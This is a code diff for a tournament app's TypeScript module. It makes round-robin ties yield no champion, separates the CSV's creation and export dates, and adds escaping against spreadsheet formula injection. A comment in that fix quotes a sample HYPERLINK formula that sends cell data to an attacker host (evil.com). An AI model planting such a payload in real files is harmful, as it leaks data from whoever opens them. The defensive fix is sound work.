@@ -47,10 +47,17 @@ export function resolveTournamentChampion(
     return survivors.length === 1 ? (survivors[0] ?? null) : null
   }
 
-  // Round-robin: highest total_points, with a stable order — no artificial
-  // tiebreaker beyond join order (matches what the leaderboard renders).
+  // Round-robin: highest total_points. A tie at the top is NOT a champion —
+  // the certificate is a printed artifact naming one person, and picking
+  // whichever tied player the sort happened to order first would crown someone
+  // with no better claim than the runner-up. Matches the bracket/school
+  // branches above, and the UI copy ("available once a single champion is
+  // crowned"), which both require an unambiguous winner.
   const sorted = [...players].sort((a, b) => b.total_points - a.total_points)
-  return sorted[0] ?? null
+  const leader = sorted[0]
+  if (!leader) return null
+  const tiedAtTop = sorted.filter((p) => p.total_points === leader.total_points).length > 1
+  return tiedAtTop ? null : leader
 }
 
 /**
@@ -76,10 +83,23 @@ const CSV_HEADERS_ROUND_ROBIN = ['Rank', 'Player', 'Points', 'Games Played', 'Li
 const CSV_HEADERS_BRACKET = ['Rank', 'Player', 'Games Played', 'Status'] as const
 const CSV_HEADERS_SCHOOL = ['Rank', 'Player', 'Class Reached', 'Status'] as const
 
-/** RFC-4180-ish escape: wrap in quotes and double any inner quotes. */
+/**
+ * RFC-4180-ish escape: wrap in quotes and double any inner quotes.
+ *
+ * Also neutralises spreadsheet formula injection. Player names are chosen by
+ * whoever joins the tournament, and Excel/Sheets/LibreOffice evaluate a cell
+ * starting with `=`, `+`, `-`, `@`, tab or CR as a formula EVEN when it is
+ * quoted — so a player called `=HYPERLINK("http://evil.com?d="&A1,"Click")`
+ * would run against the organiser who opens the participation CSV. Prefixing
+ * with an apostrophe makes the spreadsheet treat it as literal text; the
+ * apostrophe is not shown in the cell.
+ */
+const FORMULA_TRIGGER = /^[=+\-@\t\r]/
+
 function csvCell(value: unknown): string {
   const s = value == null ? '' : String(value)
-  return `"${s.replace(/"/g, '""')}"`
+  const safe = FORMULA_TRIGGER.test(s) ? `'${s}` : s
+  return `"${safe.replace(/"/g, '""')}"`
 }
 
 function csvRow(cells: unknown[]): string {
@@ -102,7 +122,9 @@ function csvRow(cells: unknown[]): string {
 export function buildParticipationCsv(
   tournament: Tournament,
   players: TournamentPlayer[],
-  games: TournamentGame[]
+  games: TournamentGame[],
+  /** When the export was produced. Injected so the output is deterministic in tests. */
+  exportedAt: Date = new Date()
 ): string {
   const ranked = orderForExport(tournament, players, games)
   const format = tournament.format
@@ -114,7 +136,11 @@ export function buildParticipationCsv(
     csvRow(['Tournament', tournament.title]),
     csvRow(['Format', format]),
     csvRow(['Players', players.length]),
-    csvRow(['Exported', new Date(tournament.created_at).toISOString().slice(0, 10)]),
+    // Two distinct dates: when the event was set up, and when this file was
+    // produced. The header used to label created_at as "Exported", so two
+    // exports weeks apart carried the same date.
+    csvRow(['Created', new Date(tournament.created_at).toISOString().slice(0, 10)]),
+    csvRow(['Exported', exportedAt.toISOString().slice(0, 10)]),
     '',
   ]
 
